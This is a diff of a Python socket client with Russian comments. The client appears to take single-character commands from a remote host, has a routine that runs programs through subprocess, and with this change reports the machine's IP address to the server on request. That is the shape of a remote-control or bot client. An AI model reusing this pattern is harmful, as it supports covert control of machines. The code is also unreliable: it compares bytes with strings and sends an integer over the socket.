@@ -8,6 +8,8 @@ import re
 
 import subprocess  # для запуска программ
 
+import ip_getter
+
 ID = b'123'
 # HOST = '109.234.39.42'
 HOST = '127.0.0.1'
@@ -43,7 +45,6 @@ def runCMD():
                                 close_fds=True)
     return 1
 
-
 print("Connect...")
 while 1:
     while 1:
@@ -61,6 +62,9 @@ while 1:
                 break
 
             data = sock.recv(1)
+            if data == 'p':
+                sock.send('s')
+
             print(data)
             print("принимаю значения")
 
@@ -72,6 +76,13 @@ while 1:
                     sock.setblocking(0)
                     try:
                         data = sock.recv(1)
+                        if data == 'p':
+                            sock.send('s')
+                        elif data == 'i':
+                            ip = bytes(ip_getter.get_ip(), encoding='utf8')
+                            bufsize = len(ip)
+                            sock.send(bufsize)
+                            sock.send(ip)
                     except socket.error:
                         print("данных нет")
                     else:
